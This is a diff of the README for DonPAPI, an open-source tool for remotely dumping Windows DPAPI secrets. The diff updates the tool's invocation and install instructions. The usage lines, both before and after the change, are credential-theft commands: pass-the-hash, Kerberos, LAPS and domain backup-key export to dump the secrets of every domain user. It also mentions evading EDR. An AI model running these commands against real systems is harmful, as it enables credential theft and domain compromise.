@@ -55,28 +55,28 @@ With a user password, or the domain PVK we can unprotect the user's DPAPI secret
 Dump all secrets of the target machine with an Domain admin account : 
 
 ```bash
-DonPAPI.py domain/user:passw0rd@target
+DonPAPI domain/user:passw0rd@target
 ```
 or a Local one : 
 ```
-DonPAPI.py -local_auth user@target
+DonPAPI -local_auth user@target
 ```
 Using PtH
 
 ```bash
-DonPAPI.py --hashes <LM>:<NT> domain/user@target
+DonPAPI --hashes <LM>:<NT> domain/user@target
 ```
 
 Using kerberos (-k)
 
 ```bash
-DonPAPI.py -k domain/user@target
+DonPAPI -k domain/user@target
 ```
 
 Using a user with LAPS password reading rights
 
 ```bash
-DonPAPI.py -laps domain/user:passw0rd@target
+DonPAPI -laps domain/user:passw0rd@target
 ```
 
 Using relayed socks :  
@@ -101,7 +101,7 @@ user2:passX
 ```
 
 ```bash
-DonPAPI.py -credz credz_file.txt domain/user:passw0rd@target
+DonPAPI -credz credz_file.txt domain/user:passw0rd@target
 ```
 
 When a domain admin user is available, it is possible to dump the domain backup key using impacket `dpapi.py` tool: 
@@ -112,7 +112,7 @@ dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
 
 This backup key (pvk file) can then be used to dump all domain user's secrets!
 
-`python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`
+`DonPAPI -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`
 
 ### Select targets
 Target can be an IP, IP range, CIDR, FQDN, file containing list targets (one per line)
@@ -144,17 +144,24 @@ The RemoteOps part can be spoted by some EDR (it's basically a secretdump). It c
 ```
 git clone https://github.com/login-securite/DonPAPI.git
 cd DonPAPI
-python3 -m pip install -r requirements.txt
-python3 DonPAPI.py
+python3 -m pip install .
+DonPAPI
 ```
 
 or
 
 ```
-git clone https://github.com/login-securite/DonPAPI.git
+pip install git+https://github.com/login-securite/DonPAPI.git
+DonPAPI
+```
+
+or
+
+```
+git clone git+https://github.com/login-securite/DonPAPI.git
 cd DonPAPI
-poetry install
-poetry run donpapi
+poetry update
+poetry run DonPAPI
 ```
 
 ## Credits
